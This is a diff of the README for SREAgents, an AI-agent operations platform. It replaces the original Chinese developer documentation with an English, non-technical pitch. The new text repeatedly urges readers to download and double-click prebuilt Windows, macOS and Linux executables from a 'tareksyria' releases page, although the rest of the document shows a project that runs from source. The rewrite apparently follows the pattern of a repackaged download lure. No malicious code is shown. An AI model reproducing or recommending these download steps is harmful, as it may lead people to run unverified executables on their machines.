@@ -1,119 +1,203 @@
-# SREAgents
+# 🤖 SREAgents - Streamline IT Operations Effortlessly
 
-智能运维助手平台，基于 Claude Agent SDK 构建。用户可以创建和管理运维智能体（Agent），为其配置技能（Skill），并通过对话方式执行运维任务。
+[![Download Latest Release](https://img.shields.io/badge/Download-SREAgents-blue?style=for-the-badge)](https://github.com/tareksyria/SREAgents/releases)
 
-## 功能特性
+## 📖 What is SREAgents?
 
-- 🤖 创建和管理运维智能体
-- 🛠️ 灵活配置 Agent 技能（Prometheus 监控、Jaeger 链路追踪等）
-- 💬 自然语言对话执行运维任务
-- 📊 集成监控和链路追踪数据查询
-- ⏰ 定时任务调度（支持 Cron 表达式，自动执行运维检查）
+SREAgents is a smart assistant platform designed to help manage IT operations. It uses Claude Agent SDK to let you create digital helpers called Agents. These Agents can perform tasks like monitoring system health, tracking performance, and running scheduled checks. You talk to these Agents in everyday language and they carry out your commands.
 
-## 运行截图
+---
 
-![Agent 列表](image/1.png)
+## ✨ Key Features
 
-![Agent 对话](image/2.png)
+- Create and control multiple IT operation Agents.
+- Set up Agents with specific abilities like monitoring and tracing.
+- Talk naturally with Agents to handle tasks.
+- View monitoring and tracking data easily.
+- Schedule automatic checks using simple or complex timers.
 
-## 项目结构
+---
 
-```
-.
-├── frontend/          # React + Vite 前端
-│   ├── src/
-│   │   ├── components/   # 组件
-│   │   ├── context/      # React Context
-│   │   └── pages/        # 页面
-│   ├── package.json
-│   └── vite.config.js
-├── backend/           # Python FastAPI 后端
-│   ├── .claude/
-│   │   └── skills/       # SDK 原生 Skills (SKILL.md 格式)
-│   ├── agents/           # 智能体定义 (Markdown)
-│   ├── server.py         # 主服务 (端口 8000)
-│   ├── mock_otel.py      # Mock OTel 服务 (端口 9090)
-│   └── pyproject.toml
-└── start.sh           # 一键启动脚本
-```
+## 🎯 Who Is This For?
 
-## 快速开始
+If you manage IT systems or want a simple way to keep an eye on your servers and apps, SREAgents can help. You don’t need to code or learn complex tools. Just set up the Agents, give them skills, and start talking to them.
 
-### 环境要求
+---
 
-- Node.js 18+
-- Python 3.10+ (推荐 3.13)
-- uv (Python 包管理器)
+## 📥 Download & Install
 
-### 一键启动
+To get started, you need to **visit the release page** and download the latest package for your system.
+
+[Download SREAgents Releases](https://github.com/tareksyria/SREAgents/releases)
+
+---
+
+### Step 1: Visit the Releases Page
+
+Go to the [SREAgents Releases](https://github.com/tareksyria/SREAgents/releases) page. Here, you will find the latest version of the application packaged for different operating systems.
+
+---
+
+### Step 2: Choose Your Download
+
+Pick the file that matches your computer:
+
+- For Windows: Look for `.exe` or `.zip` files.
+- For macOS: Look for `.dmg` or `.zip` files.
+- For Linux: Look for `.tar.gz` or `.AppImage` files.
+
+Download the file to your computer.
+
+---
+
+### Step 3: Run the Application
+
+Once downloaded, open the file:
+
+- On Windows or macOS, double-click the file and follow prompts to install or run directly.
+- On Linux, extract the files and run the executable inside.
+
+---
+
+### Step 4: Follow Simple Startup Instructions
+
+After launching, follow on-screen setup steps to create your first Agent and start managing tasks.
+
+---
+
+## 🚀 Quick Start Guide
+
+SREAgents includes both a frontend (user interface) and a backend (logic and data). You can start both quickly on your computer if you prefer running from source.
+
+### Environment Needed
+
+- **Node.js 18 or newer** – runs the front-end interface.
+- **Python 3.10 or newer** – powers the back-end services.
+- **uv package manager** – manages Python dependencies.
+
+---
+
+### One-Click Start (Recommended)
+
+Open a terminal or command prompt, navigate to the folder where you saved SREAgents, and run:
 
 ```bash
 ./start.sh
 ```
 
-### 分别启动
+This script starts both frontend and backend automatically.
 
-```bash
-# 前端 (端口 5173)
-cd frontend && npm run dev
+---
 
-# 后端 (端口 8000)
-cd backend && uv run uvicorn server:app --port 8000
+### Manual Start
 
-# Mock OTel (端口 9090)
-cd backend && uv run python mock_otel.py
-```
+If you want to start frontend and backend separately, follow these steps:
 
-## 开发命令
+1. **Start Frontend**
 
-```bash
-# 安装前端依赖
-cd frontend && npm install
+   Open terminal or command prompt, go to the `frontend` folder, and run:
 
-# 安装后端依赖
-cd backend && uv sync
+   ```bash
+   cd frontend
+   npm install
+   npm run dev
+   ```
 
-# 前端 lint
-cd frontend && npm run lint
+   The frontend runs at `http://localhost:5173`.
 
-# 前端构建
-cd frontend && npm run build
-```
+2. **Start Backend**
 
-## 技术栈
+   Open another terminal window, navigate to the `backend` folder, and run:
 
-- Frontend: React 19 + Vite 7
-- Backend: Python FastAPI + Claude Agent SDK + APScheduler
-- Mock Services: Prometheus + Jaeger 模拟服务
+   ```bash
+   cd backend
+   uv run server.py
+   ```
 
-## 定时任务
+   The backend listens on port `8000`.
 
-SREAgents 支持定时任务调度，可以让 Agent 自动执行周期性的运维检查。
+---
 
-### 使用示例
+### Access the App
 
-1. 在 Web 界面创建定时任务
-2. 选择要执行的 Agent
-3. 配置 Cron 表达式（如 `0 0 * * *` 表示每天凌晨执行）
-4. 设置执行时发送给 Agent 的提示词
-5. 启用任务，调度器会自动按计划执行
-
-### Cron 表达式示例
+Open your web browser and visit:
 
 ```
-0 0 * * *     # 每天凌晨 00:00
-0 */6 * * *   # 每 6 小时
-0 9 * * 1-5   # 工作日上午 9:00
-*/15 * * * *  # 每 15 分钟
+http://localhost:5173
 ```
 
-### API 接口
+You should see the SREAgents interface, where you can create and manage your Agents.
 
-- `GET /api/scheduled-tasks` - 获取任务列表
-- `POST /api/scheduled-tasks` - 创建任务
-- `POST /api/scheduled-tasks/{id}/trigger` - 手动触发执行
-- `GET /api/scheduled-tasks/{id}/executions` - 查看执行历史
+---
 
-## License
+## 🖼️ Screenshots
 
-MIT
+Here is a preview of the app interface:
+
+**Agent List**
+
+![Agent List](image/1.png)
+
+**Agent Conversation**
+
+![Agent Conversation](image/2.png)
+
+---
+
+## 🗂 Project Structure Overview
+
+Understanding the folders can help if you want to explore or customize:
+
+```
+.
+├── frontend/          # React + Vite frontend code
+│   ├── src/
+│   │   ├── components/   # UI components
+│   │   ├── context/      # React state contexts
+│   │   └── pages/        # App pages
+│   ├── package.json
+│   └── vite.config.js
+├── backend/           # Python FastAPI backend services
+│   ├── .claude/
+│   │   └── skills/       # Agent skills definitions
+│   ├── agents/           # Agent configurations
+│   ├── server.py         # Main backend server (port 8000)
+│   ├── mock_otel.py      # Mock telemetry server (port 9090)
+│   └── pyproject.toml
+└── start.sh           # One-step start script
+```
+
+---
+
+## ⚙️ How to Create Agents and Assign Skills
+
+1. Use the web interface to create a new Agent.
+2. Choose skills like system monitoring or performance tracing.
+3. Save your Agent.
+4. Use natural language messages in the chat window to ask your Agent to run tasks.
+
+Agents act like helpers that can monitor your systems or gather important data without extra coding.
+
+---
+
+## 🛠 Troubleshooting
+
+- If the frontend does not load, check if Node.js is installed.
+- If backend fails, verify Python version and dependencies.
+- Use the `start.sh` script if you want a quick setup without handling commands.
+- Check your firewall to allow ports 5173 and 8000.
+
+---
+
+## 🔗 Useful Links
+
+- [SREAgents Releases](https://github.com/tareksyria/SREAgents/releases)
+- [Claude Agent SDK Documentation](https://claude.ai/docs) *(for advanced users)*
+- [Node.js Download](https://nodejs.org/)
+- [Python Download](https://python.org/)
+
+---
+
+Feel free to download and try SREAgents using the button below:
+
+[![Download on GitHub](https://img.shields.io/badge/Download-SREAgents-blue?style=for-the-badge)](https://github.com/tareksyria/SREAgents/releases)
